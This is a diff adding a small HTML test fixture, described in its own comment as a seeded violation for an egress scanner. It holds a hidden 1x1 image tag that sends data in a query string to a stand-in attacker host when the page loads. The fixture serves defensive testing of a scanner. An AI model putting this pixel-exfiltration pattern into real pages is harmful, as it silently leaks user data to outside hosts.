@@ -1,0 +1,13 @@
+<!doctype html>
+<!--
+  SEEDED VIOLATION — negative control for sec-a2-egress-scan.mjs. Never executed.
+  Expected sink: html-remote-ref (img[src]). The zero-JavaScript exfil: the query
+  string is the payload and the GET happens on parse. Nothing here is a call, a
+  construction, or an import, so the AST leg of the scanner is structurally
+  incapable of seeing it — this fixture is the reason the markup leg exists.
+-->
+<html lang="en">
+  <body>
+    <img src="https://evil.invalid/pixel.gif?d=snippet" width="1" height="1" alt="" />
+  </body>
+</html>
